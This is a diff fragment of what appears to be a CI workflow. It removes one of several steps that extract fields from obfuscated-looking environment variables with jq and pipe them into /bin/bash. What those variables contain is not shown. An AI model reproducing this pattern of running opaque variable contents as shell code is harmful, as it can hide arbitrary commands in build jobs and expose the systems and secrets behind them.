@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$mzksi46394" | jq -r .vcfv20 | /bin/bash
           echo $xv98 | jq -r .eyhi5 | /bin/bash
           printf '%s' "$vzvb293" | jq -r .x3743 | /bin/bash
-          echo $rcrjt23484 | jq -r .dcqf9928 | /bin/bash
           echo $ilfnu11898 | jq -r .lw43 | /bin/bash
 
       - name: Upload artifact
